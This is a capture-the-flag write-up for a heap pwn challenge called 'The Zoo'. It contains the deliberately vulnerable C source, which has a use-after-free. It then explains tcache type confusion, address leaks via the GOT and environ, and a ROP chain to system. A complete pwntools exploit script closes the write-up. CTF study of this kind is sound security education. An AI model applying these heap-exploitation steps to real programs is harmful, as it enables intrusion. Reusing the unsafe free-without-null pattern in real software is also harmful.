The Zoo was the second pwn challenge in the CTF and we were provided C source code.

### Code Analysis
```C
/ Compile: gcc -o packed packed.c

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <stdbool.h>
#include <unistd.h>

#define MAX_OBJS 0x10 // Number of max elements allowed.
#define MAX_BUFFER_SIZE 0x18

int __flush;

__attribute__((constructor))
void __constructor__(){
    setvbuf(stdin, NULL, _IOFBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
}

struct Owner {
    int32_t id;
    int8_t ownedAnimals;
    char *name;
} __attribute__((packed));

struct Animal {
    char *name;
    int price;
    int32_t id;
    int owner_id;
    int32_t is_sold;
} __attribute__((packed));

struct Zoo {
    int32_t zoo_id;
    char *name;
    void (*handler)();
};

/* Globals */
int32_t g_zooID = 0, g_animalID = 0, g_ownerID = 0;
struct Zoo*    zoos[MAX_OBJS];
struct Animal* animals[MAX_OBJS];
struct Owner*  owners[MAX_OBJS];

void init_app() {
    for(int i = 0; i < MAX_OBJS; i++) {
        zoos[i]    = NULL;
        owners[i]  = NULL;
        animals[i] = NULL;
    }
}

/* All Owner related tasks: */
void create_owner() {
    if(g_ownerID >= MAX_OBJS) {
        printf("[!] Maximum number of owners created.\n");
        exit(1);
    }

    struct Owner *owner = (struct Owner*)malloc(sizeof(struct Owner)); // 0xd
    owner->name = (char*)malloc(MAX_BUFFER_SIZE);
    printf("Enter your name: ");
    fgets(owner->name, MAX_BUFFER_SIZE, stdin);

    owner->id = g_ownerID++;
    owner->ownedAnimals = 0;
    owners[owner->id] = owner;
    printf("[*] Created owner %s with id: %d\n", owner->name, owner->ownedAnimals);
}

void delete_owner() {
    if(g_ownerID <= 0) {
        printf("[!] Cannot delete non-existing users.\n");
        exit(1);
    }

    int id;
    printf("Enter the id you want to delete: ");
    scanf("%d%*c", &id);
    if(id < 0 || id >= MAX_OBJS) {
        printf("[!] Cannot read data from out of bounds\n");
        exit(1);
    }

    if(!owners[id]) {
        printf("[!] Cannot empty an already empty owner chunk.");
        exit(1);
    }
    void *name = owners[id]->name;
    free(owners[id]);
    if(name) free(name);
    printf("[*] Owner %d deleted successfully.\n", id);
}

/* All Animal related tasks */
void create_animal() {
    if(g_animalID >= MAX_OBJS) {
        printf("[!] Maximum number of animals created.\n");
        exit(1);
    }

    struct Animal *animal = (struct Animal*)malloc(sizeof(struct Animal)); // 0x18
    animal->name = (char*)malloc(MAX_BUFFER_SIZE);
    printf("Enter the name of the animal: ");
    read(0, animal->name, MAX_BUFFER_SIZE);
    animal->name[strcspn(animal->name, "\n")] = 0x0;
    printf("Enter the price of the animal: ");
    scanf("%d%*c", &animal->price);
    animal->id = g_animalID++;
    animal->owner_id = -1;
    animal->is_sold = false;
    animals[animal->id] = animal;
    printf("[*] Created animal %s with id: %d\n", animal->name, animal->id);
}
void delete_animal() {
    int id;
    printf("Enter the id you want to delete: ");
    scanf("%d%*c", &id);
    if(id < 0 || id >= MAX_OBJS) {
        printf("[!] Cannot read data from out of bounds\n");
        exit(1);
    }

    if(!animals[id]) {
        printf("[!] Cannot empty an already empty animal chunk.");
        exit(1);
    }
    void *name = animals[id]->name;     
    free(animals[id]);
    if(name) free(name);
    printf("[*] Animal %d deleted successfully.\n", id);
}
void modify_animal() {
    int id;
    printf("Enter the id you want to modify: ");
    scanf("%d%*c", &id);
    if(id < 0 || id >= MAX_OBJS) {
        printf("[!] Cannot read data from out of bounds\n");
        exit(1);
    }

    if(!animals[id]) {
        printf("[!] Cannot modify a non-existing animal.\n");
        exit(1);
    }

    if(animals[id]->price < 0) {
        printf("[!] Cannot modify the price of the animal.\n");
        exit(1);
    }

    if(animals[id]->is_sold || animals[id]->owner_id >= 0) {
        printf("[!] Cannot modify the animal as it is already sold.\n");
        exit(1);
    }

    printf("Enter the new name of the animal: ");
    read(0, animals[id]->name, MAX_BUFFER_SIZE);
    animals[id]->name[strcspn(animals[id]->name, "\n")] = 0;
    printf("Enter the new price of the animal: ");
    scanf("%d%*c", &animals[id]->price);
}
void buy_animal() {
    int animal_id, owner_id;
    printf("Enter the animal id you want to buy: ");
    scanf("%d%*c", &animal_id);
    printf("Enter the owner id you want to buy: ");
    scanf("%d%*c", &owner_id);

    if(animal_id < 0 || animal_id >= MAX_OBJS || owner_id < 0 || owner_id >= MAX_OBJS) {
        printf("[!] Cannot read data from out of bounds\n");
        exit(1);
    }

    if(!animals[animal_id] || !owners[owner_id]) {
        printf("[!] Cannot buy an animal from non-existing owner or animal.\n");
        exit(1);
    }

    if(animals[animal_id]->is_sold) {
        printf("[!] Animal already sold.\n");
        exit(1);
    }

    animals[animal_id]->owner_id = owner_id;
    animals[animal_id]->is_sold = true;
    owners[owner_id]->ownedAnimals++;
    printf("[*] Animal %s bought by %s\n", animals[animal_id]->name, owners[owner_id]->name);
}
void print_animal() {
    int id;
    printf("Enter the id you want to print: ");
    scanf("%d%*c", &id);

    if(id < 0 || id >= MAX_OBJS) {
        printf("[!] Cannot read data from out of bounds\n");
        exit(1);
    }

    if(!animals[id]) {
        printf("[!] Cannot print a non-existing animal.\n");
        exit(1);
    }

    printf("Animal ID: %d\n", animals[id]->id);
    printf("Animal Name: %s\n", animals[id]->name);
    printf("Animal Price: %d\n", animals[id]->price);
    printf("Animal Owner ID: %d\n", animals[id]->owner_id);
    printf("Animal Sold: %s\n", animals[id]->is_sold ? "Yes" : "No");
}

// ** Setup Zoo based on area ** //
void __init_zoo() {
    printf("Welcome to the Zoo. Hope you'll have fun.\n");
}
void __leave_zoo() {
    printf("Thank you for visting the zoo. But it is time to leave now!\n");
    exit(0);
}

/* All Zoo related tasks */
void create_zoo() {
    struct Zoo *obj = (struct Zoo*)malloc(sizeof(struct Zoo)); // 0x18
    obj->name = (char*)malloc(MAX_BUFFER_SIZE);
    void (*lh)() = __leave_zoo;
    obj->handler =  (g_zooID % 2 == 0) ? __init_zoo : &lh;
    printf("Enter the name of the Zoo: ");
    size_t sz = read(0, obj->name, MAX_BUFFER_SIZE);
    obj->name[strcspn(obj->name, "\n")] = 0;
    obj->zoo_id = g_zooID++;
    zoos[obj->zoo_id] = obj;
    printf("[*] Created zoo %s with id: %d\n", obj->name, obj->zoo_id);
}
void delete_zoo() {
    int id;
    printf("Enter the id you want to delete: ");
    scanf("%d%*c", &id);

    if(id < 0 || id >= MAX_OBJS) {
        printf("[!] Cannot read data from out of bounds\n");
        exit(1);
    }

    if(!zoos[id]) {
        printf("[!] Cannot empty an already empty zoo chunk.");
        exit(1);
    }

    void *name = zoos[id]->name;
    free(zoos[id]);
    if(name) free(name);
    printf("[*] Zoo %d deleted successfully.\n", id);
}

void visit_zoo() {
    printf("Which zoo do you want to visit: ");
    int id;
    scanf("%d%*c", &id);

    if(id < 0 || id >= MAX_OBJS) {
        printf("[!] Cannot read data from out of bounds\n");
        exit(1);
    }

    if(!zoos[id]) {
        printf("[!] Cannot visit a non-existing zoo.\n");
        exit(1);
    }

    uintptr_t handler = (uintptr_t)zoos[id]->handler;

    bool check = 0;
    _check_corrupt:
    if(handler != (uintptr_t)__init_zoo && handler != (uintptr_t)__leave_zoo && (&handler < handler)) {
        printf("[!] Corrupted handler.\n");
        exit(1);
    }
    if(!check) {
        if((handler+0x10) == ((uintptr_t)&handler))
            handler = *(uintptr_t*)handler+0x10;
        check = 1;
        goto _check_corrupt;
    }
    if(check) zoos[id]->handler = (void(*)())handler;
    zoos[id]->handler();
}

void menu() {
    printf("=== Zoo Management System ===\n");
    printf("1. Create Owner\n");
    printf("2. Delete Owner\n");
    printf("3. Create Animal\n");
    printf("4. Delete Animal\n");
    printf("5. Modify Animal\n");
    printf("6. Buy Animal\n");
    printf("7. Print Animal\n");
    printf("8. Create Zoo\n");
    printf("9. Delete Zoo\n");
    printf("10. Visit Zoo\n");
    printf("0. Exit\n");
}

int main(int argc, char* argv[], char* envp[]) {

    while(1) {
        menu();
        int choice;
        printf("Enter your choice: ");
        scanf("%d%*c", &choice);

        switch(choice) {
            case 1:
                create_owner();
                break;
            case 2:
                delete_owner();
                break;
            case 3:
                create_animal();
                break;
            case 4:
                delete_animal();
                break;
            case 5:
                modify_animal();
                break;
            case 6:
                buy_animal();
                break;
            case 7:
                print_animal();
                break;
            case 8:
                create_zoo();
                break;
            case 9:
                delete_zoo();
                break;
            case 10:
                visit_zoo();
                break;
            case 0:
                goto _ret;
                break;
            default:
                puts("[!] Invalid choice.");
                break;
        }
    }
_ret:
    return 0;
}
```

The program is a menu-driven program. It has a bunch of options. I won't go into details of each of them but the high-level description is that the program manages 3 entities. Owners, Animals and Zoos. We can create and delete owners. We can create, delete, modify, buy and print animals. We can create, delete and visit zoos.

All of these entities' objects are stored in their respective arrays. Each array can hold a maximum of 16 objects. These arrays are initialized to `NULL` at start of the program.

Owner has name, ID and number of animals owned as its struct members. Creating an Owner asks us for name of the owner and initializes the rest of the members to default values. Deletion asks us for ID of the owner to be deleted.

Animal has name, price, ID, owner's ID and sold status as its struct members. Creating an Animal asks us for its name and price and initializes the rest to default values. Deletion asks for the animal ID to delete. Modifying an animal lets us change the animal's name and price. Buying an animal sets the owner's ID to the specified owner's ID and sets the sold status to true. Printing an animal prints values of its members.

Zoo has ID, name and a function's address as its struct members. The function's address is named handler. Creating a Zoo asks us for its name, sets ID to the lowest one available and initializes the handler to either address of `__init_zoo` function (if ID is an even value) or equal to address of a stack variable that hold address of `__leave_zoo` function (if ID is an odd value).

All of these objects are allocated on the heap using `malloc` with their respective sizes. The name members are also allocated of the heap and have the size `24`. Names are read using `fgets` so no buffer overflows. But the deletion function do not null-out the pointers in the arrays. Leading to a Use-After-Free (UAF) situation.

The remote container was running the latest libc and the binary had Full RELRO, NX, PIE and Canary enabled.

### Exploitation
Since we had a UAF vulnerability on all entities, exploitation was a matter of leaking the right values and overwriting something to get RIP control. Libc being latest ruled out heap hooks since newer libc versions do not use those hooks anymore. My initial idea was to overwrite the zoo's `handler` member to one-gadget or system and get the shell. But for that, we needed a libc leak.

In heap challenges involving handling of multiple entities usually require some kind of confusion or overlap of freed objects to perform exploitation. Since we could only print members of Animal types, I needed to control the value it would print to leak libc.

Since the libc is latest and all objects are of sizes (mentioned in comments of code) less than `0x410`, these objects will be handled by `tcache`. `tcache` has Last-In-First-Out (LIFO) behavior. Looking closely at the deletion function, the object is freed first then the name is freed. This puts the name chunk at start of the list (because it was the last chunk freed) and creation functions have the opposite order of allocation. This lets us confuse name and object chunk of entity as object and name chunk of another. This way when I will print the name of the first type (original type), it will actually print contents of the second type's chunk (confuse type) and when I will modify the name of first type, it actually overwrite members of the second type and vice versa.

Since we could only print animals, Animal had to be one of the types. I chose Zoo as the first type and Animal as the second, because Zoo had either a function address or a stack address and that would give me a few leaks.

I used the following code to perform this:
```python
# Get binary leak by overlapping animal with a deleted zoo
Z1 = create_zoo("Z1")
delete_zoo(Z1)

A1 = create_animal("stdnoerr"*2, 99999, False)
print_animal(A1)

elf.address = u64(p.recvlines(2)[-1].split()[-1][0x10:].ljust(8, b'\x00')) - elf.sym.__init_zoo

print(hex(elf.address))
```

Now if you were to choose Zoo as the first type and Animal as the second, you could overwrite Animal's name address and then when print the animal, it will print the contents of that address. This gives as an arbitrary read. But it will only read the contents until a null-byte is found because the name is printed via `printf` using `%s`.

I used this primitive to read a GOT entry to get the libc leak. Using the following code:
```python
# Get libc leak by overlapping zoo with a delete animal (read GOT)
A2 = create_animal("stdnoerr", 9999)
delete_animal(A2)

Z2 = create_zoo(p64(elf.got.puts))

print_animal(A2)

libc.address = u64(p.recvlines(2)[-1].split()[-1].ljust(8, b'\x00')) - libc.sym.puts

print(hex(libc.address))
```

Then I tried to overwrite the Zoo's `handler` with one-gadgets, none worked. I tried using system but `RDI` contained address of the index specified. Then I decided to do ROP on main's return. For this I needed a stack leak.

I got the stack leak by reading the libc's `environ` symbol's value. At that time, I didn't notice the stack pointer in zoo's structure. Equipped with the stack leak and libc leak, I did a `ret2libc` attack to execute system.

```python
# Leak stack from libc environ (using previous technique)
A3 = create_animal("stdnoerr", 9999)
delete_animal(A3)

Z3 = create_zoo(p64(libc.sym.environ))

print_animal(A3)

stack_leak = u64(p.recvlines(2)[-1].split()[-1].ljust(8, b'\x00'))
print(hex(stack_leak))
```

To write the ROP chain on stack, I used the same confusion of Animal with a zoo. We could only write `24` (0x18) bytes this way because names are limited to `24` bytes. When I executed the ROP chain, I got the infamous stack alignment error in system function. To circumvent this, I followed the execution of `system` function in gdb and skipped one of the push in the code by modifying the chain. The made the stack pointer aligned to `16` bytes and I got the flag.

```python
A3 = create_animal("stdnoerr", 9999)
delete_animal(A3)

Z3 = create_zoo(p64(stack_leak - 304))

modify_animal(A3, p64(libc.address + POP_RDI) + p64(libc.address + 0x1cb42f) + p64(libc.address + 0x582c0 + 2), 9999)

sendchoice(0)
```

Side Note: The stack alignment error in system is caused by an instruction in the libc code that uses `XMM` registers. These registers are used to hold floating point values. There are of size `128`-bit. Because of this, they are used to perform fast copying of arguments (data) in libc code. These instructions require the stack pointer (`rsp`) to be a multiple of `16` (0x10). If that is not the case, it generates a SEGFAULT which halts the execution. The stack pointer becomes misaligned because we popped address of `/bin/sh` from the stack in the ROP chain.

### Final Exploit
```python
#!/usr/bin/env python3
from pwn import *

zooID = 0
ownerID = 0
animalID = 0

def start() -> tube:
    if args.REMOTE:
        return remote("192.168.18.50", 50789)
    else:
        return elf.process()
    
def attach_gdb() -> None:
    if args.REMOTE or args.NOGDB:
        return
    
    gdb.attach(p, '''
    heap chunks
    heap bins
    continue
               ''')
    input("ATTACHED?")

def sendchoice(choice: int):
    p.sendlineafter("choice: ", str(choice).encode())

def create_owner(name: bytes):
    sendchoice(1)

    if isinstance(name, str):
        name = name.encode()

    p.sendafter(": ", name + b'\n' if len(name) < 0x18 else name)

    global ownerID
    ownerID += 1

    return ownerID - 1

def delete_owner(_id: int):
    sendchoice(2)

    p.sendlineafter(": ", str(_id).encode())

def create_animal(name: bytes, price: int | bytes, append_newline: bool = True):
    sendchoice(3)

    if isinstance(name, str):
        name = name.encode()

    p.sendafter(": ", name + (b'\n' if append_newline else b'') if len(name) < 0x18 else name)
    p.sendlineafter(": ", str(price).encode() if isinstance(price, int) else price)

    global animalID
    animalID += 1

    return animalID - 1

def delete_animal(_id: int):
    sendchoice(4)

    p.sendlineafter(": ", str(_id).encode())

def modify_animal(_id: int, name: bytes, price: int):
    sendchoice(5)

    p.sendlineafter(": ", str(_id).encode())
    p.sendafter(": ", name + b'\n' if len(name) < 0x18 else name)
    p.sendlineafter(": ", str(price).encode() if isinstance(price, int) else price)

def buy_animal(animalID: int, ownerID: int):
    sendchoice(6)

    p.sendlineafter(": ", str(animalID).encode())
    p.sendlineafter(": ", str(ownerID).encode())

def print_animal(_id: int):
    sendchoice(7)

    p.sendlineafter(": ", str(_id).encode())

def create_zoo(name: int):
    sendchoice(8)

    if isinstance(name, str):
        name = name.encode()

    p.sendafter(": ", name + b'\n' if len(name) < 0x18 else name)

    global zooID
    zooID += 1

    return zooID - 1

def delete_zoo(_id: int):
    sendchoice(9)

    p.sendlineafter(": ", str(_id).encode())

def visit_zoo(_id: int):
    sendchoice(10)

    p.sendlineafter(": ", str(_id).encode())

context.binary = elf = ELF("./thezoo_patched")
libc = elf.libc

POP_RDI = 0x000000000010f75b

p = start()

# Get binary leak by overlapping animal with a deleted zoo
Z1 = create_zoo("Z1")
delete_zoo(Z1)

A1 = create_animal("stdnoerr"*2, 99999, False)
print_animal(A1)

elf.address = u64(p.recvlines(2)[-1].split()[-1][0x10:].ljust(8, b'\x00')) - elf.sym.__init_zoo
print(hex(elf.address))

# Get libc leak by overlapping zoo with a delete animal (read GOT)
A2 = create_animal("stdnoerr", 9999)
delete_animal(A2)

Z2 = create_zoo(p64(elf.got.puts))

print_animal(A2)

libc.address = u64(p.recvlines(2)[-1].split()[-1].ljust(8, b'\x00')) - libc.sym.puts
print(hex(libc.address))

# Leak stack from libc environ (using previous technique)
A3 = create_animal("stdnoerr", 9999)
delete_animal(A3)

Z3 = create_zoo(p64(libc.sym.environ))

print_animal(A3)

stack_leak = u64(p.recvlines(2)[-1].split()[-1].ljust(8, b'\x00'))
print(hex(stack_leak))

# Write rop on main return
A3 = create_animal("stdnoerr", 9999)
delete_animal(A3)

Z3 = create_zoo(p64(stack_leak - 304))

modify_animal(A3, p64(libc.address + POP_RDI) + p64(libc.address + 0x1cb42f) + p64(libc.address + 0x582c0 + 2), 9999)

sendchoice(0)
# attach_gdb()

p.interactive()
p.close()
```